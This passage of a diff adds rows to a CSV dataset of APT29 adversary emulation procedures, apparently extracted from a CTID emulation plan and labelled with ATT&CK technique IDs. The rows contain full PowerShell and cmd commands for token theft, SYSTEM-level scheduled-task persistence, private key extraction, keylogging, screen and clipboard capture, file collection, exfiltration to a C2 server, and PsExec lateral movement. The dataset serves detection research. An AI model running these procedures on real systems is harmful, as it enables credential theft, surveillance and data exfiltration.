+CreateProcessWithToken -CommandLine 'cmd.exe /c schtasks /create /tn ""Resume Viewer Update Checker"" /tr "".\sandcat.exe #{server} evals"" /sc ONLOGON /RU SYSTEM';
+CreateProcessWithToken -CommandLine 'cmd.exe /c dir /s /b #{remote.file.share}';
+CreateProcessWithToken -CommandLine 'cmd.exe /c tree %USERPROFILE%';
+RevertToSelf;
+","[""T1134""]","[""T1134""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::76,76,Access Token Manipulation,attack_id: T1134 | name: Access Token Manipulation,"[""T1134""]","[""T1134""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::77,77,Credentials In Files (T1081) - Private Keys Extraction,"id: c4f4b13c-87b6-498c-b814-93570173068c | name: Credentials In Files (T1081) - Private Keys Extraction | description: Obtain credentials via Custom PowerShell | tactic: credential-access | technique: attack_id: T1552.004 | name: Unsecured Credentials: Private Keys | cti_source: https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf | procedure_group: procedure_cred_access | procedure_step: 6.B | platforms: windows: psh,pwsh: command: Import-PfxCertificate -Exportable -FilePath "".\dmevals.local.pfx"" -CertStoreLocation Cert:\LocalMachine\My;
+
+if (! $(test-path -path ""C:\Program Files\SysinternalsSuite"")) {
+  write-host ""[!] The path C:\Program Files\SysinternalsSuite does not exist. Execution has stopped."";
+  exit 1;
+}
+Set-Location -path ""C:\Program Files\SysinternalsSuite"";
+. .\readme.ps1;
+Get-PrivateKeys;
+if ($? -eq $True) {
+    write-host ""[+] Successfully executed private key collection script."";
+    exit 0;
+} else {
+    write-host ""[!] Error, could not execution Get-PrivateKeys."";
+    exit 1;
+}
+ | payloads: dmevals.local.pfx | executors: name: powershell | command: Import-PfxCertificate -Exportable -FilePath "".\dmevals.local.pfx"" -CertStoreLocation Cert:\LocalMachine\My;
+
+if (! $(test-path -path ""C:\Program Files\SysinternalsSuite"")) {
+  write-host ""[!] The path C:\Program Files\SysinternalsSuite does not exist. Execution has stopped."";
+  exit 1;
+}
+Set-Location -path ""C:\Program Files\SysinternalsSuite"";
+. .\readme.ps1;
+Get-PrivateKeys;
+if ($? -eq $True) {
+    write-host ""[+] Successfully executed private key collection script."";
+    exit 0;
+} else {
+    write-host ""[!] Error, could not execution Get-PrivateKeys."";
+    exit 1;
+}
+","[""T1081"", ""T1552.004""]","[""T1081"", ""T1552""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::78,78,Unsecured Credentials: Private Keys,attack_id: T1552.004 | name: Unsecured Credentials: Private Keys,"[""T1552.004""]","[""T1552""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::79,79,Staging files for PowerShell module imports,"id: a4b14c10-49aa-4ae4-b165-d5a37364fe62 | name: Staging files for PowerShell module imports | description: Renaming psversion.txt to psversion.txt to be imported | tactic: defensive-evasion | technique: attack_id: T1036.005 | name: Masquerading: Match Legitimate Name or Location | cti_source: https://securelist.com/the-cozyduke-apt/69731/ | procedure_group: procedure_def_evasion | procedure_step: 7.A.1 | platforms: windows: psh,pwsh: command: if (! $(test-path -path ""C:\Program Files\SysInternalsSuite"")) {
+  write-host ""[!] The path C:\Program Files\SysInternalsSuite does not exist. Execution has stopped."";
+  exit 1;
+}
+
+Set-Location -path ""C:\Program Files\SysInternalsSuite"";
+if (test-path -path "".\psversion.txt"" ) {
+  move-item .\psversion.txt psversion.ps1 -Force;
+}
+  write-host ""[+] File psversion.ps1 staged to be imported.""
+ | executors: name: powershell | command: if (! $(test-path -path ""C:\Program Files\SysInternalsSuite"")) {
+  write-host ""[!] The path C:\Program Files\SysInternalsSuite does not exist. Execution has stopped."";
+  exit 1;
+}
+
+Set-Location -path ""C:\Program Files\SysInternalsSuite"";
+if (test-path -path "".\psversion.txt"" ) {
+  move-item .\psversion.txt psversion.ps1 -Force;
+}
+  write-host ""[+] File psversion.ps1 staged to be imported.""
+","[""T1036.005""]","[""T1036""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::80,80,Masquerading: Match Legitimate Name or Location,attack_id: T1036.005 | name: Masquerading: Match Legitimate Name or Location,"[""T1036.005""]","[""T1036""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::81,81,Screen Capturing,"id: a81ea4ad-bc9f-49a7-82d4-4466df641487 | name: Screen Capturing | description: Load custom PowerShell module and take screenshots. | tactic: collection | technique: attack_id: T1113 | name: Screen Capture | cti_source: https://securelist.com/the-cozyduke-apt/69731/ | procedure_group: procedure_collection | procedure_step: 7.A.2 | platforms: windows: psh,pwsh: command: if (! $(test-path -path ""C:\Program Files\SysinternalsSuite\psversion.ps1"";)) {
+  write-host ""[!] The path C:\Program Files\SysinternalsSuite\psversion.ps1 does not exist. Execution has stopped."";
+  exit 1;
+}
+
+Set-Location -path ""C:\Program Files\SysinternalsSuite"";
+. .\psversion.ps1;
+Invoke-ScreenCapture; Start-Sleep -Seconds 3; View-Job -JobName ""Screenshot"";
+ | executors: name: powershell | command: if (! $(test-path -path ""C:\Program Files\SysinternalsSuite\psversion.ps1"";)) {
+  write-host ""[!] The path C:\Program Files\SysinternalsSuite\psversion.ps1 does not exist. Execution has stopped."";
+  exit 1;
+}
+
+Set-Location -path ""C:\Program Files\SysinternalsSuite"";
+. .\psversion.ps1;
+Invoke-ScreenCapture; Start-Sleep -Seconds 3; View-Job -JobName ""Screenshot"";
+","[""T1113""]","[""T1113""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::82,82,Screen Capture,attack_id: T1113 | name: Screen Capture,"[""T1113""]","[""T1113""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::83,83,Automated Collection (T1119) - Clipboard (T1115),"id: ee4c2eab-be57-434c-a32c-14b77360301a | name: Automated Collection (T1119) - Clipboard (T1115) | description: Get contents of clipboard | tactic: collection | technique: attack_id: T1115 | name: Clipboard Data | cti_source: https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf | procedure_group: procedure_collection | procedure_step: 7.A.3 | platforms: windows: psh,pwsh: command: $clip_data=get-clipboard;
+if ($clip_data.Length -gt 0) {
+  write-host ""[+] Clipboard data obtained!\n"";
+  write-host $clip_data;
+} else {
+  write-host ""[!] No clipboard data available!\n"";
+}
+ | executors: name: powershell | command: $clip_data=get-clipboard;
+if ($clip_data.Length -gt 0) {
+  write-host ""[+] Clipboard data obtained!\n"";
+  write-host $clip_data;
+} else {
+  write-host ""[!] No clipboard data available!\n"";
+}
+","[""T1115"", ""T1119""]","[""T1115"", ""T1119""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::84,84,Clipboard Data,attack_id: T1115 | name: Clipboard Data,"[""T1115""]","[""T1115""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::85,85,Automated Collection (T1119) - Input Capture (T1417),"id: db28f68d-e8b8-46e6-b680-642570d4b257 | name: Automated Collection (T1119) - Input Capture (T1417) | description: Load custom PowerShell module, and grab keystrokes for 15 seconds. | tactic: collection | technique: attack_id: T1056.001 | name: Input Capture: Keylogging | cti_source: https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf | procedure_group: procedure_collection | procedure_step: 7.A.4 | platforms: windows: psh,pwsh: command: if (! $(test-path -path ""C:\Program Files\SysinternalsSuite"")) {
+  write-host ""[!] The path C:\Program Files\SysinternalsSuite does not exist. Execution has stopped."";
+  exit 1;
+}
+Set-Location -path ""C:\Program Files\SysinternalsSuite"";
+. .\psversion.ps1;
+Get-Keystrokes;
+Start-Sleep -Seconds 15;
+View-Job -JobName ""Keystrokes"";
+ | executors: name: powershell | command: if (! $(test-path -path ""C:\Program Files\SysinternalsSuite"")) {
+  write-host ""[!] The path C:\Program Files\SysinternalsSuite does not exist. Execution has stopped."";
+  exit 1;
+}
+Set-Location -path ""C:\Program Files\SysinternalsSuite"";
+. .\psversion.ps1;
+Get-Keystrokes;
+Start-Sleep -Seconds 15;
+View-Job -JobName ""Keystrokes"";
+","[""T1056.001"", ""T1119"", ""T1417""]","[""T1056"", ""T1119"", ""T1417""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::86,86,Input Capture: Keylogging,attack_id: T1056.001 | name: Input Capture: Keylogging,"[""T1056.001""]","[""T1056""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::87,87,Data from staged file (T1074) and Exfiltration over C2 Channel (T1041),"id: a612311d-a802-48da-bb7f-88a4b9dd7a24 | name: Data from staged file (T1074) and Exfiltration over C2 Channel (T1041) | description: Compress all data within Download directory and exfiltrate the results. | tactic: exfiltration | technique: attack_id: T1041 | name: Exfiltration Over C2 Channel | cti_source: https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf | procedure_group: procedure_exfiltration | procedure_step: 7.B.1 | platforms: windows: psh,pwsh: command: Write-Host ""[*] Compressing all the things in download dir"";
+Compress-Archive -Path ""C:\Users\#{profile_user}\Downloads\*.*"" -DestinationPath ""$env:APPDATA\OfficeSupplies.zip"";
+
+Import-Module .\upload.ps1 -Verbose -Force;
+Invoke-MultipartFormDataUpload -InFile ""$env:APPDATA\OfficeSupplies.zip"" -Uri ""#{server}/file/upload"";
+if ($?) {
+  write-host ""[+] Data exfil of download directory completed!"";
+} else {
+  write-host ""[!] Data exfil failed!"";
+}
+ | payloads: upload.ps1 | input_arguments: profile_user: description: Name of profile user | type: string | default: Administrator | server: description: IP or Hostname of server | type: string | default: 192.0.2.10 | executors: name: powershell | command: Write-Host ""[*] Compressing all the things in download dir"";
+Compress-Archive -Path ""C:\Users\#{profile_user}\Downloads\*.*"" -DestinationPath ""$env:APPDATA\OfficeSupplies.zip"";
+
+Import-Module .\upload.ps1 -Verbose -Force;
+Invoke-MultipartFormDataUpload -InFile ""$env:APPDATA\OfficeSupplies.zip"" -Uri ""#{server}/file/upload"";
+if ($?) {
+  write-host ""[+] Data exfil of download directory completed!"";
+} else {
+  write-host ""[!] Data exfil failed!"";
+}
+","[""T1041"", ""T1074""]","[""T1041"", ""T1074""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::88,88,Exfiltration Over C2 Channel,attack_id: T1041 | name: Exfiltration Over C2 Channel,"[""T1041""]","[""T1041""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::89,89,Remote File Copy (T1105),"id: 9b518cfb-125f-466e-872b-4f8171773ce5 | name: Remote File Copy (T1105) | description: A token theft script was executed to steal and assume the token of another user’s existing process, changing the user context of the process. | tactic: defensive-evasion | technique: attack_id: T1134.001 | name: Access Token Manipulation: Token Impersonation/Theft | cti_source: https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf | procedure_group: procedure_def_evasion | procedure_step: 7.B.2 | platforms: windows: psh,pwsh: command: Import-Module .\StealToken.ps1 -Verbose -Force;
+StealToken;
+CreateProcessWithToken -CommandLine 'cmd.exe /c reg query ""\\#{remote.file.share}\hklm\system\currentcontrolset\control\terminal server""';
+CreateProcessWithToken -CommandLine 'cmd.exe /c schtasks /create /tn ""Resume Viewer Update Checker"" /tr "".\sandcat.exe #{server} evals"" /sc ONLOGON /RU SYSTEM';
+CreateProcessWithToken -CommandLine 'cmd.exe /c dir /s /b #{remote.file.share}';
+CreateProcessWithToken -CommandLine 'cmd.exe /c tree %USERPROFILE%';
+RevertToSelf;
+ | payloads: StealToken.ps1 | sandcat.go-windows | input_arguments: remote.file.share: description: IP or Hostname of remote file share | type: string | default: 192.0.2.20 | server: description: IP or Hostname of server | type: string | default: 192.0.2.10 | executors: name: powershell | command: Import-Module .\StealToken.ps1 -Verbose -Force;
+StealToken;
+CreateProcessWithToken -CommandLine 'cmd.exe /c reg query ""\\#{remote.file.share}\hklm\system\currentcontrolset\control\terminal server""';
+CreateProcessWithToken -CommandLine 'cmd.exe /c schtasks /create /tn ""Resume Viewer Update Checker"" /tr "".\sandcat.exe #{server} evals"" /sc ONLOGON /RU SYSTEM';
+CreateProcessWithToken -CommandLine 'cmd.exe /c dir /s /b #{remote.file.share}';
+CreateProcessWithToken -CommandLine 'cmd.exe /c tree %USERPROFILE%';
+RevertToSelf;
+","[""T1105"", ""T1134.001""]","[""T1105"", ""T1134""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::90,90,Access Token Manipulation: Token Impersonation/Theft,attack_id: T1134.001 | name: Access Token Manipulation: Token Impersonation/Theft,"[""T1134.001""]","[""T1134""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::91,91,Scheduled Tasks (T1053),"id: 6b90da47-13d0-48fc-8f07-0a1e6d5d876e | name: Scheduled Tasks (T1053) | description: A token theft script was executed to steal and assume the token of another user’s existing process, changing the user context of the process. | tactic: defensive-evasion | technique: attack_id: T1134.001 | name: Access Token Manipulation: Token Impersonation/Theft | cti_source: https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf | procedure_group: procedure_def_evasion | procedure_step: 7.C.1 | platforms: windows: psh,pwsh: command: Import-Module .\StealToken.ps1 -Verbose -Force;
+StealToken;
+CreateProcessWithToken -CommandLine 'cmd.exe /c reg query ""\\#{remote.file.share}\hklm\system\currentcontrolset\control\terminal server""';
+CreateProcessWithToken -CommandLine 'cmd.exe /c schtasks /create /tn ""Resume Viewer Update Checker"" /tr "".\sandcat.exe #{server} evals"" /sc ONLOGON /RU SYSTEM';
+CreateProcessWithToken -CommandLine 'cmd.exe /c dir /s /b #{remote.file.share}';
+CreateProcessWithToken -CommandLine 'cmd.exe /c tree %USERPROFILE%';
+RevertToSelf;
+ | payloads: StealToken.ps1 | sandcat.go-windows | input_arguments: remote.file.share: description: IP or Hostname of remote file share | type: string | default: 192.0.2.20 | server: description: IP or Hostname of server | type: string | default: 192.0.2.10 | executors: name: powershell | command: Import-Module .\StealToken.ps1 -Verbose -Force;
+StealToken;
+CreateProcessWithToken -CommandLine 'cmd.exe /c reg query ""\\#{remote.file.share}\hklm\system\currentcontrolset\control\terminal server""';
+CreateProcessWithToken -CommandLine 'cmd.exe /c schtasks /create /tn ""Resume Viewer Update Checker"" /tr "".\sandcat.exe #{server} evals"" /sc ONLOGON /RU SYSTEM';
+CreateProcessWithToken -CommandLine 'cmd.exe /c dir /s /b #{remote.file.share}';
+CreateProcessWithToken -CommandLine 'cmd.exe /c tree %USERPROFILE%';
+RevertToSelf;
+","[""T1053"", ""T1134.001""]","[""T1053"", ""T1134""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::92,92,Access Token Manipulation: Token Impersonation/Theft,attack_id: T1134.001 | name: Access Token Manipulation: Token Impersonation/Theft,"[""T1134.001""]","[""T1134""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::93,93,Remote System Discovery (T1018),"id: 95564347-e77a-4a89-b08f-dcafa5468f2c | name: Remote System Discovery (T1018) | description: Custom PowerShell script to perform AD triage for domain bound computers. | tactic: execution | technique: attack_id: T1059.001 | name: Command and Scripting Interpreter: PowerShell | cti_source: https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf | procedure_group: procedure_execution | procedure_step: 8.A.1 | platforms: windows: psh,pwsh: command: if (! $(test-path -path ""C:\Program Files\SysinternalsSuite"")) {
+  write-host ""[!] The path C:\Program Files\SysinternalsSuite does not exist. Execution has stopped."";
+  exit 1;
+}
+
+Set-Location -path ""C:\Program Files\SysinternalsSuite"";
+. .\psversion.ps1;
+Ad-Search Computer Name *;
+ | executors: name: powershell | command: if (! $(test-path -path ""C:\Program Files\SysinternalsSuite"")) {
+  write-host ""[!] The path C:\Program Files\SysinternalsSuite does not exist. Execution has stopped."";
+  exit 1;
+}
+
+Set-Location -path ""C:\Program Files\SysinternalsSuite"";
+. .\psversion.ps1;
+Ad-Search Computer Name *;
+","[""T1018"", ""T1059.001""]","[""T1018"", ""T1059""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::94,94,Command and Scripting Interpreter: PowerShell,attack_id: T1059.001 | name: Command and Scripting Interpreter: PowerShell,"[""T1059.001""]","[""T1059""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::95,95,Identifying current user on other machines,"id: c4a59e39-53b0-4ace-9528-8ff052752ece | name: Identifying current user on other machines | description: Custom PowerShell script to perform AD triage for domain bound computers. | tactic: execution | technique: attack_id: T1059.001 | name: Command and Scripting Interpreter: PowerShell | cti_source: https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf | procedure_group: procedure_execution | procedure_step: 8.A.2 | platforms: windows: psh: command: Invoke-Command -ComputerName ""$(hostname)"" -ScriptBlock { Get-Process -IncludeUserName | Select-Object UserName,SessionId | Where-Object { $_.UserName -like ""*\$env:USERNAME"" } | Sort-Object SessionId -Unique } | Select-Object UserName,SessionId -Last 1;
+ | executors: name: powershell | command: Invoke-Command -ComputerName ""$(hostname)"" -ScriptBlock { Get-Process -IncludeUserName | Select-Object UserName,SessionId | Where-Object { $_.UserName -like ""*\$env:USERNAME"" } | Sort-Object SessionId -Unique } | Select-Object UserName,SessionId -Last 1;
+","[""T1059.001""]","[""T1059""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::96,96,Command and Scripting Interpreter: PowerShell,attack_id: T1059.001 | name: Command and Scripting Interpreter: PowerShell,"[""T1059.001""]","[""T1059""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::97,97,File and Directory Discovery (T1083),"id: 9fefcde6-083a-4440-8eca-dc03d30c0bcb | name: File and Directory Discovery (T1083) | description: A token theft script was executed to steal and assume the token of another user’s existing process, changing the user context of the process. | tactic: defensive-evasion | technique: attack_id: T1134.001 | name: Access Token Manipulation: Token Impersonation/Theft | cti_source: https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf | procedure_group: procedure_def_evasion | procedure_step: 8.A.3 | platforms: windows: psh,pwsh: command: Import-Module .\StealToken.ps1 -Verbose -Force;
+StealToken;
+CreateProcessWithToken -CommandLine 'cmd.exe /c reg query ""\\#{remote.file.share}\hklm\system\currentcontrolset\control\terminal server""';
+CreateProcessWithToken -CommandLine 'cmd.exe /c schtasks /create /tn ""Resume Viewer Update Checker"" /tr "".\sandcat.exe #{server} evals"" /sc ONLOGON /RU SYSTEM';
+CreateProcessWithToken -CommandLine 'cmd.exe /c dir /s /b #{remote.file.share}';
+CreateProcessWithToken -CommandLine 'cmd.exe /c tree %USERPROFILE%';
+RevertToSelf;
+ | payloads: StealToken.ps1 | sandcat.go-windows | input_arguments: remote.file.share: description: IP or Hostname of remote file share | type: string | default: 192.0.2.20 | server: description: IP or Hostname of server | type: string | default: 192.0.2.10 | executors: name: powershell | command: Import-Module .\StealToken.ps1 -Verbose -Force;
+StealToken;
+CreateProcessWithToken -CommandLine 'cmd.exe /c reg query ""\\#{remote.file.share}\hklm\system\currentcontrolset\control\terminal server""';
+CreateProcessWithToken -CommandLine 'cmd.exe /c schtasks /create /tn ""Resume Viewer Update Checker"" /tr "".\sandcat.exe #{server} evals"" /sc ONLOGON /RU SYSTEM';
+CreateProcessWithToken -CommandLine 'cmd.exe /c dir /s /b #{remote.file.share}';
+CreateProcessWithToken -CommandLine 'cmd.exe /c tree %USERPROFILE%';
+RevertToSelf;
+","[""T1083"", ""T1134.001""]","[""T1083"", ""T1134""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::98,98,Access Token Manipulation: Token Impersonation/Theft,attack_id: T1134.001 | name: Access Token Manipulation: Token Impersonation/Theft,"[""T1134.001""]","[""T1134""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::99,99,Copy Sandcat File,"id: bddc0abc-07a0-41b7-813f-e0c64d9226b3 | name: Copy Sandcat File | description: Copy Sandcat file using PsExec | tactic: lateral-movement | technique: attack_id: T1105 | name: Ingress Tool Transfer | cti_source: https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf | procedure_group: procedure_lat_movement | procedure_step: 8.B | platforms: windows: psh,pwsh: command: move-item sandcat.go-windows-upx C:\Windows\temp\python.exe -force;
+set-location ""C:\Program Files\SysinternalsSuite\"";
+.\PsExec64.exe -accepteula \\#{pivot_machine_hostname} -i #{user.session.id} -d -f -c ""C:\Windows\Temp\python.exe"" -group ""day-1-lateral-movement"" -server ""#{server}"";
+tasklist /S #{pivot_machine_hostname} /FI ""IMAGENAME eq python.exe"";
+ | payloads: sandcat.go-windows-upx | input_arguments: pivot_machine_hostname: description: Hostname of pivot machine | type: string | default: pivothost | user.session.id: description: Session id for user | type: string | default: 1 | server: description: IP or Hostname of server | type: string | default: 192.0.2.10 | executors: name: powershell | command: ","[""T1105""]","[""T1105""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::100,100,Ingress Tool Transfer,attack_id: T1105 | name: Ingress Tool Transfer,"[""T1105""]","[""T1105""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::101,101,Screen Capture (T1113),"id: 0b1841bd-ef8b-475c-bce7-8fcb2860984a | name: Screen Capture (T1113) | description: Native API call(s) were used to collect a screenshot. | tactic: collection | technique: attack_id: T1113 | name: Screen Capture | cti_source: https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf | procedure_group: procedure_collection | procedure_step: 8.D.1 | platforms: windows: psh,pwsh: command: Import-Module .\Get-Screenshot.ps1 -Verbose -Force;
+Get-Screenshot;
+ | payloads: Get-Screenshot.ps1 | executors: name: powershell | command: Import-Module .\Get-Screenshot.ps1 -Verbose -Force;
+Get-Screenshot;
+","[""T1113""]","[""T1113""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::102,102,Screen Capture,attack_id: T1113 | name: Screen Capture,"[""T1113""]","[""T1113""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::103,103,File and Directory Discovery (T1083),"id: d5170a60-3bdc-44e0-9870-a38db5c0cf81 | name: File and Directory Discovery (T1083) | description: PowerShell's Get-ChildItem alias 'ls' is used to enumerate files in a remote file share. | tactic: discovery | technique: attack_id: T1083 | name: File and Directory Discovery | cti_source: https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf | procedure_group: procedure_discovery | procedure_step: 9.A.1 | platforms: windows: psh,pwsh: command: ls #{remote.file.share}
+ | input_arguments: remote.file.share: description: IP or Hostname of remote file share | type: string | default: 192.0.2.20 | executors: name: powershell | command: ls #{remote.file.share}
+","[""T1083""]","[""T1083""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::104,104,File and Directory Discovery,attack_id: T1083 | name: File and Directory Discovery,"[""T1083""]","[""T1083""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::105,105,Automated document collection (T1119),"id: 08e57385-dbce-4850-8bb7-589ef79465ab | name: Automated document collection (T1119) | description: Execute PowerShell collection command to collect and compress files of specific extensions. | tactic: execution | technique: attack_id: T1059.001 | name: Command and Scripting Interpreter: PowerShell | cti_source: https://www.fireeye.com/blog/products-and-services/2019/02/state-of-the-hack-no-easy-breach-revisited.html | procedure_group: procedure_execution | procedure_step: 9.B.1 | platforms: windows: psh,pwsh: command: move-item Rar.exe -Destination C:\Windows\Temp -Force;
+$env:APPDATA;$files=ChildItem -Path $env:USERPROFILE\ -Include *.doc,*.xps,*.xls,*.ppt,*.pps,*.wps,*.wpd,*.ods,*.odt,*.lwp,*.jtd,*.pdf,*.zip,*.rar,*.docx,*.url,*.xlsx,*.pptx,*.ppsx,*.pst,*.ost,*psw*,*pass*,*login*,*admin*,*sifr*,*sifer*,*vpn,*.jpg,*.txt,*.lnk -Recurse -ErrorAction SilentlyContinue | Select -ExpandProperty FullName; Compress-Archive -LiteralPath $files -CompressionLevel Optimal -DestinationPath $env:APPDATA\working.zip -Force;
+cd C:\Windows\Temp;
+.\Rar.exe a -hpfGzq5yKw ""$env:USERPROFILE\Desktop\working.zip"" ""$env:APPDATA\working.zip"";
+ | payloads: rar.exe | executors: name: powershell | command: move-item Rar.exe -Destination C:\Windows\Temp -Force;
+$env:APPDATA;$files=ChildItem -Path $env:USERPROFILE\ -Include *.doc,*.xps,*.xls,*.ppt,*.pps,*.wps,*.wpd,*.ods,*.odt,*.lwp,*.jtd,*.pdf,*.zip,*.rar,*.docx,*.url,*.xlsx,*.pptx,*.ppsx,*.pst,*.ost,*psw*,*pass*,*login*,*admin*,*sifr*,*sifer*,*vpn,*.jpg,*.txt,*.lnk -Recurse -ErrorAction SilentlyContinue | Select -ExpandProperty FullName; Compress-Archive -LiteralPath $files -CompressionLevel Optimal -DestinationPath $env:APPDATA\working.zip -Force;
+cd C:\Windows\Temp;
+.\Rar.exe a -hpfGzq5yKw ""$env:USERPROFILE\Desktop\working.zip"" ""$env:APPDATA\working.zip"";
+","[""T1059.001"", ""T1119""]","[""T1059"", ""T1119""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
+apt29,apt29,unknown,apt29::106,106,Command and Scripting Interpreter: PowerShell,attack_id: T1059.001 | name: Command and Scripting Interpreter: PowerShell,"[""T1059.001""]","[""T1059""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
